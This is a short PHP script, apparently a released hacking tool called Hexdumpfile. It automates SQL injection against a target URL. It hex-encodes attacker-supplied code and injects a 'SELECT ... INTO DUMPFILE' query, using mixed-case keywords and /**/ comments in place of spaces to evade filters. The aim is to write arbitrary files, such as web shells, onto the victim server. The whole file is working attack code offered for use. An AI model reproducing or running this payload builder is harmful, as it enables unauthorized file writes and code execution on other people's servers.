<?php

/*

	Hexdumpfile is a Script to Create File with the Specified Code in a Site.
	
    Copyright (C) 2010 Hexon

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


*/

$Hexdumpfile_Version = "v1.0.0";

error_reporting(-1);

include("Con_Url_WD.php");

if(isset($_POST['dumpfilesubmit']))
{
if(isset($_POST['url']))
{
if(isset($_POST['code']))
{
if(isset($_POST['path']))
{
echo 
'
<title>
Hexdumpfile -- Manual Into DumpFile
</title>
<head>
<body background="Hex1.jpg"></body>

<style type="text/css">
<!--body {background-color: black}-->
<!-- body {color : gold} -->
body {color : white}
h2 {color : white}
</style>
';

$url = $_POST['url'];
$code = "0x".bin2hex($_POST['code']);
$path = $_POST['path'];
$whitespace = "/**/";
if(preg_match("/hexon/i",$url))
{
$into_dump_file_query = "(SEleCt aLl $code into duMPfILe '$path')";
$idumpfile = str_replace(" ",$whitespace,$into_dump_file_query);
/*echo $idumpfile;*/
$into_dump_file_query = str_replace("hexon",$idumpfile,$url);
/*echo $into_dump_file_query , "<br />";*/
geturl($into_dump_file_query);
if(preg_match("/already exists/i",geturl($into_dump_file_query),$match))
{
echo "File is Created in <b>htmlspecialchars($path,ENT_QUOTES)</b>" , "<br />";
}
else
{
echo "The File may be created , test it yourself", "<br />";
}

}
else
{
die("Hexon string is not found");
}
}
}
}
}

?>